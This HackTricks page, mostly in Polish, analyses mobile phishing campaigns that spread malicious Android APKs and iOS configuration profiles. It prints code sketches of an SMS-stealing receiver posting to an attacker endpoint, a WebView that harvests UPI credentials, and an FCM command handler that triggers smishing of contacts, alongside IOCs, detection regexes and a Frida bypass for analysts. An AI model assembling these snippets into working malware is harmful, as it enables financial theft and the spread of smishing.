# Mobile Phishing & Malicious App Distribution (Android & iOS)

{{#include ../../banners/hacktricks-training.md}}

> [!INFO]
> Ta strona omawia techniki stosowane przez aktorów zagrożeń do dystrybucji **złośliwych APK Androida** i **profilów konfiguracji mobilnej iOS** poprzez phishing (SEO, inżynieria społeczna, fałszywe sklepy, aplikacje randkowe itp.).
> Materiał jest dostosowany z kampanii SarangTrap ujawnionej przez Zimperium zLabs (2025) oraz innych publicznych badań.

## Attack Flow

1. **SEO/Phishing Infrastructure**
* Zarejestruj dziesiątki podobnych domen (randkowe, chmurowe, usługi samochodowe…).
– Użyj lokalnych słów kluczowych i emoji w elemencie `<title>`, aby uzyskać wysoką pozycję w Google.
– Umieść *zarówno* instrukcje instalacji Androida (`.apk`), jak i iOS na tej samej stronie docelowej.
2. **First Stage Download**
* Android: bezpośredni link do *niepodpisanego* lub „sklepu zewnętrznego” APK.
* iOS: `itms-services://` lub zwykły link HTTPS do złośliwego **profilu mobileconfig** (patrz poniżej).
3. **Post-install Social Engineering**
* Przy pierwszym uruchomieniu aplikacja prosi o **kod zaproszenia / weryfikacji** (iluzja ekskluzywnego dostępu).
* Kod jest **wysyłany metodą POST przez HTTP** do Command-and-Control (C2).
* C2 odpowiada `{"success":true}` ➜ złośliwe oprogramowanie kontynuuje.
* Analiza dynamiczna w piaskownicy / AV, która nigdy nie przesyła ważnego kodu, nie widzi **złośliwego zachowania** (unikanie).
4. **Runtime Permission Abuse** (Android)
* Niebezpieczne uprawnienia są żądane **dopiero po pozytywnej odpowiedzi C2**:
```xml
<uses-permission android:name="android.permission.READ_CONTACTS"/>
<uses-permission android:name="android.permission.READ_EXTERNAL_STORAGE"/>
<uses-permission android:name="android.permission.READ_PHONE_STATE"/>
<!-- Starsze wersje również prosiły o uprawnienia SMS -->
```
* Ostatnie warianty **usuwają `<uses-permission>` dla SMS z `AndroidManifest.xml`**, ale pozostawiają ścieżkę kodu Java/Kotlin, która odczytuje SMS-y przez refleksję ⇒ obniża wynik statyczny, a jednocześnie działa na urządzeniach, które przyznają uprawnienia poprzez nadużycie `AppOps` lub stare cele.
5. **Facade UI & Background Collection**
* Aplikacja pokazuje nieszkodliwe widoki (przeglądarka SMS, wybieracz galerii) zaimplementowane lokalnie.
* W międzyczasie exfiltruje:
- IMEI / IMSI, numer telefonu
- Pełny zrzut `ContactsContract` (tablica JSON)
- JPEG/PNG z `/sdcard/DCIM` skompresowane z [Luban](https://github.com/Curzibn/Luban), aby zmniejszyć rozmiar
- Opcjonalna zawartość SMS (`content://sms`)
Ładunki są **spakowane w paczki** i wysyłane przez `HTTP POST /upload.php`.
6. **iOS Delivery Technique**
* Pojedynczy **profil konfiguracji mobilnej** może żądać `PayloadType=com.apple.sharedlicenses`, `com.apple.managedConfiguration` itp., aby zarejestrować urządzenie w nadzorze podobnym do „MDM”.
* Instrukcje inżynierii społecznej:
1. Otwórz Ustawienia ➜ *Profil pobrany*.
2. Stuknij *Zainstaluj* trzy razy (zrzuty ekranu na stronie phishingowej).
3. Zaufaj niepodpisanemu profilowi ➜ atakujący zyskuje uprawnienia *Kontakty* i *Zdjęcia* bez przeglądu App Store.
7. **Network Layer**
* Zwykły HTTP, często na porcie 80 z nagłówkiem HOST jak `api.<phishingdomain>.com`.
* `User-Agent: Dalvik/2.1.0 (Linux; U; Android 13; Pixel 6 Build/TQ3A.230805.001)` (bez TLS → łatwe do wykrycia).

## Defensive Testing / Red-Team Tips

* **Dynamic Analysis Bypass** – Podczas oceny złośliwego oprogramowania, zautomatyzuj fazę kodu zaproszenia za pomocą Frida/Objection, aby dotrzeć do złośliwej gałęzi.
* **Manifest vs. Runtime Diff** – Porównaj `aapt dump permissions` z runtime `PackageManager#getRequestedPermissions()`; brak niebezpiecznych uprawnień to czerwony flag.
* **Network Canary** – Skonfiguruj `iptables -p tcp --dport 80 -j NFQUEUE`, aby wykryć niesolidne wybuchy POST po wprowadzeniu kodu.
* **mobileconfig Inspection** – Użyj `security cms -D -i profile.mobileconfig` na macOS, aby wylistować `PayloadContent` i zauważyć nadmierne uprawnienia.

## Blue-Team Detection Ideas

* **Certificate Transparency / DNS Analytics** w celu wychwycenia nagłych wybuchów domen bogatych w słowa kluczowe.
* **User-Agent & Path Regex**: `(?i)POST\s+/(check|upload)\.php` z klientów Dalvik poza Google Play.
* **Invite-code Telemetry** – POST 6–8 cyfrowych kodów numerycznych krótko po instalacji APK może wskazywać na staging.
* **MobileConfig Signing** – Zablokuj niepodpisane profile konfiguracji za pomocą polityki MDM.

## Useful Frida Snippet: Auto-Bypass Invitation Code
```python
# frida -U -f com.badapp.android -l bypass.js --no-pause
# Hook HttpURLConnection write to always return success
Java.perform(function() {
var URL = Java.use('java.net.URL');
URL.openConnection.implementation = function() {
var conn = this.openConnection();
var HttpURLConnection = Java.use('java.net.HttpURLConnection');
if (Java.cast(conn, HttpURLConnection)) {
conn.getResponseCode.implementation = function(){ return 200; };
conn.getInputStream.implementation = function(){
return Java.use('java.io.ByteArrayInputStream').$new("{\"success\":true}".getBytes());
};
}
return conn;
};
});
```
## Wskaźniki (Ogólne)
```
/req/checkCode.php        # invite code validation
/upload.php               # batched ZIP exfiltration
LubanCompress 1.1.8       # "Luban" string inside classes.dex
```
---

## Android WebView Payment Phishing (UPI) – Dropper + FCM C2 Pattern

Ten wzór został zaobserwowany w kampaniach wykorzystujących tematy związane z rządowymi świadczeniami do kradzieży indyjskich danych UPI i OTP. Operatorzy łączą renomowane platformy w celu dostarczenia i odporności.

### Łańcuch dostaw na zaufanych platformach
- Wideo na YouTube jako przynęta → opis zawiera krótki link
- Krótki link → strona phishingowa GitHub Pages imitująca legalny portal
- Ta sama repozytorium GitHub hostuje APK z fałszywą odznaką „Google Play” prowadzącą bezpośrednio do pliku
- Dynamiczne strony phishingowe działają na Replit; zdalny kanał komend używa Firebase Cloud Messaging (FCM)

### Dropper z osadzonym ładunkiem i instalacją offline
- Pierwsze APK to instalator (dropper), który dostarcza prawdziwe złośliwe oprogramowanie w `assets/app.apk` i prosi użytkownika o wyłączenie Wi‑Fi/danych mobilnych, aby zminimalizować wykrywanie w chmurze.
- Osadzony ładunek instaluje się pod niewinną etykietą (np. „Bezpieczna aktualizacja”). Po instalacji zarówno instalator, jak i ładunek są obecne jako oddzielne aplikacje.

Static triage tip (grep for embedded payloads):
```bash
unzip -l sample.apk | grep -i "assets/app.apk"
# Or:
zipgrep -i "classes|.apk" sample.apk | head
```
### Dynamic endpoint discovery via shortlink
- Złośliwe oprogramowanie pobiera listę aktywnych punktów końcowych w formacie tekstowym, oddzieloną przecinkami, z krótkiego linku; proste przekształcenia ciągów generują ostateczną ścieżkę strony phishingowej.

Example (sanitised):
```
GET https://rebrand.ly/dclinkto2
Response: https://sqcepo.replit.app/gate.html,https://sqcepo.replit.app/addsm.php
Transform: "gate.html" → "gate.htm" (loaded in WebView)
UPI credential POST: https://sqcepo.replit.app/addup.php
SMS upload:           https://sqcepo.replit.app/addsm.php
```
Pseudo-kod:
```java
String csv = httpGet(shortlink);
String[] parts = csv.split(",");
String upiPage = parts[0].replace("gate.html", "gate.htm");
String smsPost = parts[1];
String credsPost = upiPage.replace("gate.htm", "addup.php");
```
### WebView-based UPI credential harvesting
- Krok „Dokonaj płatności w wysokości ₹1 / UPI‑Lite” ładuje formularz HTML atakującego z dynamicznego punktu końcowego wewnątrz WebView i przechwytuje wrażliwe pola (telefon, bank, UPI PIN), które są `POST`owane do `addup.php`.

Minimalny loader:
```java
WebView wv = findViewById(R.id.web);
wv.getSettings().setJavaScriptEnabled(true);
wv.loadUrl(upiPage); // ex: https://<replit-app>/gate.htm
```
### Samo-rozprzestrzenianie i przechwytywanie SMS/OTP
- Na pierwszym uruchomieniu żądane są agresywne uprawnienia:
```xml
<uses-permission android:name="android.permission.READ_CONTACTS"/>
<uses-permission android:name="android.permission.SEND_SMS"/>
<uses-permission android:name="android.permission.READ_SMS"/>
<uses-permission android:name="android.permission.CALL_PHONE"/>
```
- Kontakty są używane do masowego wysyłania smishing SMS z urządzenia ofiary.
- Przychodzące SMS są przechwytywane przez odbiornik rozgłoszeniowy i przesyłane z metadanymi (nadawca, treść, slot SIM, losowy identyfikator urządzenia) do `/addsm.php`.

Receiver sketch:
```java
public void onReceive(Context c, Intent i){
SmsMessage[] msgs = Telephony.Sms.Intents.getMessagesFromIntent(i);
for (SmsMessage m: msgs){
postForm(urlAddSms, new FormBody.Builder()
.add("senderNum", m.getOriginatingAddress())
.add("Message", m.getMessageBody())
.add("Slot", String.valueOf(getSimSlot(i)))
.add("Device rand", getOrMakeDeviceRand(c))
.build());
}
}
```
### Firebase Cloud Messaging (FCM) jako odporny C2
- Ładunek rejestruje się w FCM; wiadomości push zawierają pole `_type`, które jest używane jako przełącznik do wyzwalania akcji (np. aktualizacja szablonów tekstów phishingowych, przełączanie zachowań).

Przykład ładunku FCM:
```json
{
"to": "<device_fcm_token>",
"data": {
"_type": "update_texts",
"template": "New subsidy message..."
}
}
```
Szkic obsługi:
```java
@Override
public void onMessageReceived(RemoteMessage msg){
String t = msg.getData().get("_type");
switch (t){
case "update_texts": applyTemplate(msg.getData().get("template")); break;
case "smish": sendSmishToContacts(); break;
// ... more remote actions
}
}
```
### Wzorce polowania i IOCs
- APK zawiera wtórny ładunek w `assets/app.apk`
- WebView ładuje płatność z `gate.htm` i eksfiltruje do `/addup.php`
- Eksfiltracja SMS do `/addsm.php`
- Fetchowanie konfiguracji za pomocą skróconych linków (np. `rebrand.ly/*`) zwracających punkty końcowe CSV
- Aplikacje oznaczone jako ogólne „Aktualizacja/Zabezpieczona aktualizacja”
- Wiadomości FCM `data` z dyskryminatorem `_type` w nieufnych aplikacjach

### Pomysły na wykrywanie i obronę
- Oznaczaj aplikacje, które instruują użytkowników, aby wyłączyli sieć podczas instalacji, a następnie zainstalowali drugi APK z `assets/`.
- Alarmuj na krotkę uprawnień: `READ_CONTACTS` + `READ_SMS` + `SEND_SMS` + przepływy płatności oparte na WebView.
- Monitorowanie egress dla `POST /addup.php|/addsm.php` na niekorporacyjnych hostach; blokuj znaną infrastrukturę.
- Zasady EDR dla urządzeń mobilnych: nieufna aplikacja rejestrująca się do FCM i rozgałęziająca się na polu `_type`.

---

## Odniesienia

- [The Dark Side of Romance: SarangTrap Extortion Campaign](https://zimperium.com/blog/the-dark-side-of-romance-sarangtrap-extortion-campaign)
- [Luban – Android image compression library](https://github.com/Curzibn/Luban)
- [Android Malware Promises Energy Subsidy to Steal Financial Data (McAfee Labs)](https://www.mcafee.com/blogs/other-blogs/mcafee-labs/android-malware-promises-energy-subsidy-to-steal-financial-data/)
- [Firebase Cloud Messaging — Docs](https://firebase.google.com/docs/cloud-messaging)

{{#include ../../banners/hacktricks-training.md}}
